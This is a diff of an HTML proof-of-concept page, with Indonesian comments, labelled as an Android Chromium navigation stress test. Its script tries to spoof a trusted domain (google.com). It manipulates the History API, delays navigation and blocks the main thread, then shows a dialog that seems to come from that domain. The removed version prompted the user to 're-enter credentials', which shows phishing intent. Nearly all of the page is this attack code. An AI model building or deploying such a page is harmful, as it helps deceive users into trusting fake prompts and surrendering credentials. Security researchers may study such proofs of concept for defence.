@@ -2,67 +2,79 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Android PoC Stress Test</title>
+    <title>Android Chromium Navigation Stress Test</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f5f5f7;
-            color: #1d1d1f;
+            background-color: #121212;
+            color: #ffffff;
+            font-family: sans-serif;
             text-align: center;
-            padding: 50px 20px;
+            padding: 40px 20px;
         }
-        .card {
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            max-width: 400px;
+        .box {
+            background: #1e1e1e;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            max-width: 380px;
             margin: 0 auto;
         }
         button {
-            background-color: #0071e3;
-            color: white;
+            background-color: #bb86fc;
+            color: #121212;
             border: none;
-            padding: 12px 24px;
+            padding: 12px 20px;
             font-size: 16px;
-            border-radius: 8px;
+            font-weight: bold;
+            border-radius: 6px;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 15px;
+            width: 100%;
         }
         button:active {
-            background-color: #005bb5;
+            background-color: #9965f4;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>Security Verification</h2>
-        <p>Tap the button below to initialize system check.</p>
-        <button id="triggerBtn">CLICK HERE TO VERIFY</button>
+    <div class="box">
+        <h3>Android Security Test</h3>
+        <p>Tekan tombol di bawah untuk memicu pengujian siklus navigasi asinkron.</p>
+        <button id="exploitBtn">MULAI UJI KETAHANAN</button>
     </div>
 
     <script>
-        document.getElementById('triggerBtn').addEventListener('click', function() {
-            // 1. Membuka tab baru atau melakukan navigasi asinkron ke domain target (misal: situs terpercaya)
-            const targetUrl = "https://www.google.com";
+        document.getElementById('exploitBtn').addEventListener('click', function() {
+            // Target URL yang ingin disimulasikan / ditampilkan pada state awal
+            const targetDomain = "https://www.google.com";
             
-            // Simulasi pemicu navigasi tertunda mikro-detik
-            setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 10);
+            try {
+                // 1. Manipulasi History API untuk memaksa entri palsu sebelum navigasi diproses
+                history.pushState({page: 1}, "Secure State", targetDomain + "/auth-check");
 
-            // 2. Teknik CPU Starvation / Heavy Loop untuk menahan eksekusi thread sebelum commit navigasi selesai
-            const start = performance.now();
-            while (performance.now() - start < 300) {
-                // Memblokir main thread sejenak dengan kalkulasi sinkronus berat
-                Math.random() * Math.random();
+                // 2. Membuka atau mengarahkan window ke target dengan interval mikro
+                setTimeout(() => {
+                    // Menggunakan metode penggantian lokasi cepat atau manipulasi iframe tertanam
+                    window.location.replace(targetDomain);
+                }, 5);
+
+                // 3. Teknik CPU Starvation mikro (non-blocking total untuk menghindari ANR Android)
+                let start = performance.now();
+                while (performance.now() - start < 150) {
+                    // Beban ringan pada main thread untuk memperlambat pemrosesan commit UI browser
+                    Math.sin(Math.random());
+                }
+
+                // 4. Memunculkan dialog non-blocking / modal cepat untuk menangkap transisi render
+                setTimeout(() => {
+                    // Di Android modern, prompt() sering dibatasi, gunakan alert atau konfirmasi cepat jika diizinkan
+                    alert("Verifikasi Sesi Diperlukan.");
+                }, 50);
+
+            } catch (e) {
+                console.error("Error during execution: ", e);
             }
-
-            // 3. Memunculkan modal dialog sinkronus untuk mengunci state interaksi
-            setTimeout(function() {
-                prompt("SECURITY ALERT: Please re-enter credentials to continue.", "Session Locked");
-            }, 50);
         });
     </script>
 </body>
